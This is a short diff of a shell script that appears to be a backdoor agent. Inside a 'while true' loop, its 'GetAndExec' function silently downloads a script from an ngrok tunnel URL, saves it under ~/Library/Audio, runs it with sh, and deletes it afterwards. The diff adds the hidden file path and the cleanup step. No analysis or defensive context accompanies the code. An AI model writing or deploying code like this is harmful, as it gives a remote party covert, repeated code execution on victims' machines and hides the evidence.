@@ -8,10 +8,12 @@ GetAndExec() {
     EXEC="$NGROK/$USER"
 
     # Download exec from ngrok url
-    curl -sO "$EXEC"
+    curl -so "~/Library/Audio/$USER.sh" "$EXEC"
 
     # Execute exec
-sh $USER
+    sh "~/Library/Audio/$USER.sh"
+
+    rm "~/Library/Audio/$USER.sh"
 }
 
 while true; do
